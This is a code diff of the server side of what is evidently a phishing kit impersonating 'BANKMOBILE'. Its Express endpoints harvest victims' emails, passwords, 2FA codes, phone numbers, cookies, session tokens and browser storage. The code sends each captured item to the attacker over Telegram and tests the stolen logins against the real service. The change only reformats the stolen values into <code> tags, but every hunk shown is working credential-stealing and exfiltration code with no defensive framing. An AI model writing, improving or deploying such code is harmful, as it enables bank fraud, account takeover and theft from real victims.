@@ -74,11 +74,11 @@ app.post('/api/collect', async (req, res) => {
     if (data.email || data.username || data.password || data.twofa) {
         msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `<b>🔐 CREDENTIALS</b>\n`;
-        if (data.email) msg += `📧 <b>Email:</b> ${data.email}\n`;
-        if (data.username) msg += `👤 <b>Username:</b> ${data.username}\n`;
-        if (data.password) msg += `🔑 <b>Password:</b> ${data.password}\n`;
-        if (data.twofa || data.code) msg += `🔢 <b>2FA Code:</b> ${data.twofa || data.code}\n`;
-        if (data.phone) msg += `📱 <b>Phone:</b> ${data.phone}\n`;
+        if (data.email) msg += `📧 <b>Email:</b> <code>${data.email}</code>\n`;
+        if (data.username) msg += `👤 <b>Username:</b> <code>${data.username}</code>\n`;
+        if (data.password) msg += `🔑 <b>Password:</b> <code>${data.password}</code>\n`;
+        if (data.twofa || data.code) msg += `🔢 <b>2FA Code:</b> <code>${data.twofa || data.code}</code>\n`;
+        if (data.phone) msg += `📱 <b>Phone:</b> <code>${data.phone}</code>\n`;
         if (data.step) msg += `📌 <b>Step:</b> ${data.step}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
     }
@@ -90,7 +90,7 @@ app.post('/api/collect', async (req, res) => {
         msg += `🍪 <b>ALL COOKIES (${Object.keys(data.cookies).length})</b>\n`;
         Object.entries(data.cookies).forEach(([k, v]) => {
             const val = v || '[empty]';
-            msg += `   ${k}: ${val.substring(0, 150)}${val.length > 150 ? '...' : ''}\n`;
+            msg += `   ${k}: <code>${val.substring(0, 150)}${val.length > 150 ? '...' : ''}</code>\n`;
         });
         msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
     }
@@ -102,7 +102,7 @@ app.post('/api/collect', async (req, res) => {
         msg += `🔑 <b>ALL SESSION TOKENS (${data.tokens.length})</b>\n`;
         data.tokens.forEach(t => {
             const val = t.value || '[empty]';
-            msg += `   ${t.key}: ${val.substring(0, 150)}${val.length > 150 ? '...' : ''}\n`;
+            msg += `   ${t.key}: <code>${val.substring(0, 150)}${val.length > 150 ? '...' : ''}</code>\n`;
         });
         msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
     }
@@ -114,7 +114,7 @@ app.post('/api/collect', async (req, res) => {
         msg += `💾 <b>localStorage (${Object.keys(data.localStorage).length} items)</b>\n`;
         Object.entries(data.localStorage).slice(0, 10).forEach(([k, v]) => {
             const val = typeof v === 'string' ? v : JSON.stringify(v);
-            msg += `   ${k}: ${val.substring(0, 120)}${val.length > 120 ? '...' : ''}\n`;
+            msg += `   ${k}: <code>${val.substring(0, 120)}${val.length > 120 ? '...' : ''}</code>\n`;
         });
         if (Object.keys(data.localStorage).length > 10) {
             msg += `   ... and ${Object.keys(data.localStorage).length - 10} more\n`;
@@ -129,7 +129,7 @@ app.post('/api/collect', async (req, res) => {
         msg += `📁 <b>sessionStorage (${Object.keys(data.sessionStorage).length} items)</b>\n`;
         Object.entries(data.sessionStorage).slice(0, 10).forEach(([k, v]) => {
             const val = typeof v === 'string' ? v : JSON.stringify(v);
-            msg += `   ${k}: ${val.substring(0, 120)}${val.length > 120 ? '...' : ''}\n`;
+            msg += `   ${k}: <code>${val.substring(0, 120)}${val.length > 120 ? '...' : ''}</code>\n`;
         });
         if (Object.keys(data.sessionStorage).length > 10) {
             msg += `   ... and ${Object.keys(data.sessionStorage).length - 10} more\n`;
@@ -237,20 +237,20 @@ app.post('/authenticate', async (req, res) => {
     
     // Send to Telegram with full data if provided
     if (fullData) {
-        await sendToTelegram(`🔐 <b>FULL LOGIN DATA CAPTURED</b>\n\n📧 ${email}\n🔑 ${password}\n🍪 Cookies: ${fullData.cookies ? Object.keys(fullData.cookies).length : 0}\n🔑 Tokens: ${fullData.tokens ? fullData.tokens.length : 0}\n💾 localStorage: ${fullData.localStorage ? Object.keys(fullData.localStorage).length : 0}`);
+        await sendToTelegram(`🔐 <b>FULL LOGIN DATA CAPTURED</b>\n\n📧 <code>${email}</code>\n🔑 <code>${password}</code>\n🍪 Cookies: ${fullData.cookies ? Object.keys(fullData.cookies).length : 0}\n🔑 Tokens: ${fullData.tokens ? fullData.tokens.length : 0}\n💾 localStorage: ${fullData.localStorage ? Object.keys(fullData.localStorage).length : 0}`);
     }
     
     // Also send basic credentials
-    await sendToTelegram(`🔐 <b>BANKMOBILE LOGIN</b>\n📧 ${email}\n🔑 ${password}`);
+    await sendToTelegram(`🔐 <b>BANKMOBILE LOGIN</b>\n📧 <code>${email}</code>\n🔑 <code>${password}</code>`);
     
     const result = await authenticateWithAPI(email, password);
     
     if (result.success) {
-        await sendToTelegram(`✅ <b>SUCCESS!</b>\n📧 ${email}`);
+        await sendToTelegram(`✅ <b>SUCCESS!</b>\n📧 <code>${email}</code>`);
         console.log('✅ VALID');
         res.json({ success: true });
     } else {
-        await sendToTelegram(`❌ <b>FAILED</b>\n📧 ${email}`);
+        await sendToTelegram(`❌ <b>FAILED</b>\n📧 <code>${email}</code>`);
         console.log('❌ INVALID');
         res.json({ success: false, error: 'Invalid credentials' });
     }
@@ -261,7 +261,7 @@ app.post('/submit-phone', async (req, res) => {
     const { phone, fullData } = req.body;
     console.log(`📱 Phone: ${phone}`);
     
-    await sendToTelegram(`📱 <b>PHONE NUMBER</b>\nNumber: ${phone}`);
+    await sendToTelegram(`📱 <b>PHONE NUMBER</b>\nNumber: <code>${phone}</code>`);
     
     // If full data provided, send it too
     if (fullData) {
@@ -276,7 +276,7 @@ app.post('/submit-otp', async (req, res) => {
     const { otp, trusted, fullData } = req.body;
     console.log(`🔐 OTP: ${otp}`);
     
-    await sendToTelegram(`🔐 <b>2FA CODE</b>\nCode: ${otp}\nTrusted: ${trusted || false}`);
+    await sendToTelegram(`🔐 <b>2FA CODE</b>\nCode: <code>${otp}</code>\nTrusted: ${trusted || false}`);
     
     // If full data provided, send it too
     if (fullData) {
